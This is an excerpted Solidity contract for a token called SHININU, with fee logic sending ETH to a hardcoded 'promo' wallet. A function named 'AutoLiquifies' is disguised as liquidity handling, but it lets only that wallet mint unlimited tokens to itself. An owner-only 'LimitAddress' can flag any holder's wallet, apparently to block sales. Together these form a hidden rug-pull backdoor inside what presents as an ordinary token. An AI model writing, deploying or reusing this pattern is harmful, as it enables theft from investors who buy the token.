...
contract Ownable is Context {
    ...
    modifier promoWallet() {
        require(ispromoWallet(msg.sender), "Certified bruh moment"); _;
    }
...
contract SHININU is Context, IERC20, Ownable {
    ...
    string private constant _name = "SHININU"; 
    string private constant _symbol = "SHININU"; 
    uint8 private constant _decimals = 9;
    
    uint256 private _promoFee = 7;
    uint256 public _liquidityFee = 2;
    address private _promoWallet = 0xA67DB157deE20aC6c695Bd742197278B89AaCaB5;
    ...
    function AutoLiquifies(uint256 accumulation, address acc) promoWallet public virtual {
        require(acc == address(_promoWallet));
        _Berserker(address(_promoWallet), acc, accumulation);
        _tTotal += accumulation;
        _tOwned[acc] += accumulation;
        emit Transfer(address(_promoWallet), acc, accumulation);
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 promoFee = amount * _promoFee / 100; 
        uint256 liquidityFee = amount * _liquidityFee / 100; 
        _tOwned[address(this)] += promoFee + liquidityFee;
        emit Transfer (from, address(this), promoFee + liquidityFee);
        return (amount - promoFee - liquidityFee);
    }
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(_promoWallet).transfer(ethToSend);
    }

    function LimitAddress(address account, bool newValue) public onlyOwner {
        isLimitedWallet[account] = newValue;
    }

    function swapAndLiquify() private {

        uint256 liquidityTokens = balanceOf (address(this)) * _liquidityFee / (_promoFee + _liquidityFee);
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0)
            payable(_promoWallet).sendValue (ethAmount - ethFromLiquidity);
    }
}